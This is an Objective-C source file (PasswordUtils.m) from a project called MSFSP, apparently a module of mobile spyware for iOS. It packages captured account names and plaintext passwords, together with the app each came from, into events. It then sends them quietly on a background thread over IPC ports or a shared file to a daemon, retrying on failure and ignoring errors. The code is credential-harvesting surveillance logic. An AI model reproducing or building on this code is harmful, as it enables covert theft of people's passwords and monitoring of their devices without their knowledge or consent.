//
//  PasswordUtils.m
//  MSFSP
//
//  Created by Makara on 2/26/14.
//
//

#import "PasswordUtils.h"
#import "FxPasswordEvent.h"
#import "MessagePortIPCSender.h"
#import "SharedFile2IPCSender.h"
#import "DefStd.h"
#import "DaemonPrivateHome.h"
#import "DateTimeFormat.h"

#import <UIKit/UIKit.h>

static PasswordUtils *_PasswordUtils = nil;

@implementation PasswordUtils

@synthesize mIMSharedFileSender;

+ (id) sharedPasswordUtils{
	if (_PasswordUtils == nil) {
		_PasswordUtils = [[PasswordUtils alloc] init];
		
		if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
			SharedFile2IPCSender *sharedFileSender = nil;
			
			sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kPasswordMessagePort];
			[_PasswordUtils setMIMSharedFileSender:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
		}
	}
	return (_PasswordUtils);
}

+ (void) sendPasswordEvent: (FxPasswordEvent *) aFxPassword {
	PasswordUtils *passUtils = [[PasswordUtils alloc] init];
	[NSThread detachNewThreadSelector:@selector(thread:)
							 toTarget:passUtils
						   withObject:aFxPassword];
	[passUtils autorelease];
}

- (void) thread: (FxPasswordEvent *) aFxPassword {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
        NSMutableData* data = [[NSMutableData alloc] init];
        
        NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
        [archiver encodeObject:aFxPassword forKey:kPasswordArchived];
        [archiver finishEncoding];
        [archiver release];
        
        BOOL successfullySend = NO;
        successfullySend = [PasswordUtils sendDataToPort:data portName:kPasswordMessagePort];
        if (!successfullySend) {
            DLog (@"=========================================")
            DLog (@"************ successfullySend failed 0");
            DLog (@"=========================================")
            [NSThread sleepForTimeInterval:5];
            successfullySend = [PasswordUtils sendDataToPort:data portName:kPasswordMessagePort1];
            if (!successfullySend) {
                DLog (@"=========================================")
                DLog (@"************ successfullySend failed 1");
                DLog (@"=========================================")
                [NSThread sleepForTimeInterval:10];
                successfullySend = [PasswordUtils sendDataToPort:data portName:kPasswordMessagePort2];
                if (!successfullySend) {
                    DLog (@"=========================================")
                    DLog (@"************ successfullySend failed 2");
                    DLog (@"=========================================")
                }
            }
        }
        
        [data release];
    }
    @catch (NSException * e) {
        ;
    }
    @finally {
        ;
    }
    [pool release];
}
+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
	if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
		MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
		successfully = [messagePortSender writeDataToPort:aData];
		[messagePortSender release];
		messagePortSender = nil;
	} else {
		SharedFile2IPCSender *sharedFileSender = nil;
		if ([aPortName isEqualToString:kPasswordMessagePort]	||
			[aPortName isEqualToString:kPasswordMessagePort1]	||
			[aPortName isEqualToString:kPasswordMessagePort2]	) {
			sharedFileSender = [[PasswordUtils sharedPasswordUtils] mIMSharedFileSender];
        }
		successfully = [sharedFileSender writeDataToSharedFile:aData];
	}
	return (successfully);
}

+ (void) sendPasswordEventForAccount: (NSString *) aAccountName
                            password: (NSString *) aPassword
                       applicationID: (NSString *) aAppID
                     applicationName: (NSString *) aAppName {
    
    FxPasswordEvent * event     = [[FxPasswordEvent alloc ]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:aAppID];
    [event setMApplicationName:aAppName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    
    FxAppPwd *appPwd            = [[FxAppPwd alloc] init];
    [appPwd setMUserName:aAccountName];
    [appPwd setMPassword:aPassword];
    
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    
    [PasswordUtils sendPasswordEvent:event];
    
    [event release];
    
}

- (void) dealloc {
	[mIMSharedFileSender release];
	[super dealloc];
}

@end
